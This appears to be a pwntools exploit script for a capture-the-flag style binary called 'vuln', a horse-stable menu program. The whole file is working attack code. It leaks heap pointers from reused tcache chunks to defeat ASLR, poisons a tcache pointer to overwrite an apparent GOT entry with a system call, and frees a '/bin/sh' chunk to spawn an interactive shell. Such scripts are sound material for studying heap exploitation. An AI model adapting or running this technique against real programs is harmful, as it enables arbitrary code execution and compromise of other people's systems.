#! /usr/bin/python
import pwn
import time

pwn.context(binary="./vuln")
pwn.context(terminal=["xfce4-terminal", "-e"])
elf = pwn.ELF("./vuln")
libcFile = pwn.ELF("./libc.so.6")
p = elf.process()

def addHorse(stableIndex, nameLength, name):
	p.sendlineafter("Choice: ", b"1")
	p.sendlineafter("Stable index # (0-17)? ", bytes(str(stableIndex), encoding="ascii"))
	p.sendlineafter("Horse name length (16-256)? ", bytes(str(nameLength), encoding="ascii"))
	p.sendlineafter(f"Enter a string of {nameLength} characters: ", name)

def removeHorse(stableIndex):
	p.sendlineafter("Choice: ", b"2")
	p.sendlineafter("Stable index # (0-17)? ", bytes(str(stableIndex), encoding="ascii"))

def cheat(stableIndex, name):
	p.sendlineafter("Choice: ", b"0")
	p.sendlineafter("Stable index # (0-17)? ", bytes(str(stableIndex),  encoding="ascii"))
	p.sendlineafter("Enter a string of 16 characters: ", name)
	p.sendlineafter("New spot? ", b"0")

def getPointers():
	p.sendlineafter("Choice: ", b"3")
	data = b""
	x = p.recvline()
	data += x
	while (not (b"WINNER" in x)):
		x = p.recvline()
		data += x
		if (b"\n\n" in data):
			print("done recieving data!")
			break
	somePointers = data.split(b"|")
	leakedPointers = []
	
	print(data)
	for pointer in somePointers:
		pointer = pointer.strip(b" \n")
		pointer = pointer.ljust(8, b"\x00")
		pointer = pwn.u64(pointer)
		if (pointer != 0):
			leakedPointers.append(pointer)
			print(hex(pointer))
	print(f"The value you seek is {hex(min(leakedPointers))}")
	return min(leakedPointers)

#malloc some chunks of same size
for i in range(5):
	print(f"adding horse {i}")
	addHorse(i, 256, b"\xff")

#free these chunks and put them in tcache
for i in range(4, -1, -1):
	print(f"removing horse {i}")
	removeHorse(i)

#these chunks are returned to us with metadata in them
for i in range(5):
	print(f"adding horse {i}")
	addHorse(i, 256, b"\xff")

#we start racing and grab the leaked data
ASLR = getPointers()

#put two horses into tcache bin
removeHorse(0)
removeHorse(1)

#horse 1 is the first horse, make it point to 0xdeadbeef00 instead of horse 0
cheat(1, pwn.p64(0x404010 ^ ASLR) + b"\xff")

#examine our work
#pwn.gdb.attach(p, "heap bins") 
#time.sleep(2)

addHorse(0, 256, b"/bin/sh\x00\xff")
addHorse(1, 256, pwn.p64(0) + pwn.p64(0x401090) + b"\xff")
removeHorse(1)
removeHorse(0)
p.interactive()
	

